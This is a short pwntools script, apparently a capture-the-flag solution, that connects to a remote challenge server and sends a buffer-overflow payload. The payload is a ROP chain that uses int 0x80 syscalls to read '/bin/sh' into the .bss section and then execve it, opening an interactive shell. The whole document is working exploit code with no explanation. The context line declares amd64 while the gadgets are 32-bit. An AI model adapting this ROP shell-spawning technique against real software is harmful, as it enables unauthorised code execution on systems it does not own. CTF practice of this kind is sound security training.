from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28183)
pop_eax = 0x080bb2c6 
pop_edx_ecx_ebx = 0x0806ecb0
bss = 0x080eb000
int_0x80 = 0x0806F350
payload = "a"*44
payload += p32(pop_eax)+p32(0x3)
payload += p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
payload += p32(int_0x80)
payload += p32(pop_eax)+p32(0xb)
payload += p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
payload += p32(int_0x80)
io.sendline(payload)
bin_sh = "/bin/sh\x00"
io.sendline(bin_sh)
io.interactive()
